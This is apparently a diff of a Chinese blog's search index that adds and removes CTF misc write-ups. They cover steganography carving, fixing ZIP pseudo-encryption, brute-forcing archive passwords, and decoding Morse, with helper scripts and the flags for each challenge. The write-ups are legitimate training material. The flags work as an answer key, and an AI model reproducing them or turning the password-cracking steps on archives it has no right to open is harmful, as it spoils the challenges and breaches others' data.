+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
+
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
+
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTML学习以及网页搭建初实践</title>
     <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
     <content><![CDATA[<h1 id="HTML学习以及网页搭建初实践"><a href="#HTML学习以及网页搭建初实践" class="headerlink" title="HTML学习以及网页搭建初实践"></a>HTML学习以及网页搭建初实践</h1><p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
@@ -888,168 +1387,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP反序列化</title>
     <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
@@ -1147,678 +1484,6 @@ $t-&gt;b=&amp;$t-&gt;a;
 ]]></content>
       <tags>
         <tag>-web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2025春秋杯冬季赛</title>
-    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
-    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
-<p>听C3师傅说这还不算是上强度的</p>
-<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
-<p>还是要多练，下次努力不啃Misc老底</p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
-<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
-<p>解析得到</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
-<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
-<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
-<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
-<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
-<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
-<pre><code class="highlight python"><span class="keyword">import</span> zipfile
-<span class="keyword">import</span> re
-zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
-<span class="keyword">while</span> <span class="literal">True</span>:
-    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
-        ts1 = zipfile.ZipFile(zipname)
-        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
-        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
-        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
-    <span class="keyword">else</span>:
-        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
-
-<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
-<pre><code class="highlight python"><span class="keyword">import</span> zipfile
-<span class="keyword">import</span> os
-<span class="keyword">import</span> base64
-
-<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
-        encoded_password = f.read().strip()
-    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
-    <span class="keyword">return</span> decoded_password
-<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
-    <span class="keyword">try</span>:
-        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
-            zf.extractall(path=extract_to, pwd=password.encode())
-            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
-            <span class="keyword">return</span> zf.namelist()  
-    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
-        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
-        <span class="keyword">return</span> []
-<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
-    current_number = start_number
-    <span class="keyword">while</span> <span class="literal">True</span>:
-        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
-        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
-        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
-            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
-            <span class="keyword">break</span>
-        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
-            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
-            <span class="keyword">break</span>
-        password = decode_password(password_filename)
-        extracted_files = extract_zip(zip_filename, password,parent_dir)
-        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
-            <span class="keyword">break</span>
-        next_zip_file = <span class="literal">None</span>
-        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
-            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
-                next_zip_file = extracted_file
-                <span class="keyword">break</span>
-        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
-            <span class="keyword">break</span>
-        current_number -= <span class="number">1</span>
-<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
-    recursive_extract()</code></pre>
-
-<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
-<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
-<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> base64
-
-
-<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
-        encoded_password = f.read().strip()
-    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
-    <span class="keyword">return</span> decoded_password
-
-<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
-        current_number = start_number
-        <span class="keyword">while</span> <span class="literal">True</span>:
-            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
-            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
-                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
-                <span class="keyword">break</span>
-            decoded_password = decode_password(password_filename)
-            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
-            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
-            current_number += <span class="number">1</span>
-
-
-<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
-    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
-
-<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
-<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
-<p>拿到一张png，用010查一下看到zip头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
-<p>foremost提取一下</p>
-<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
-<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
-<p>脚本：</p>
-<pre><code class="highlight plaintext">import os
-import zipfile
-import tarfile
-import py7zr
-import shutil
-
-
-def extract_zip(zip_path, extract_dir):
-    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
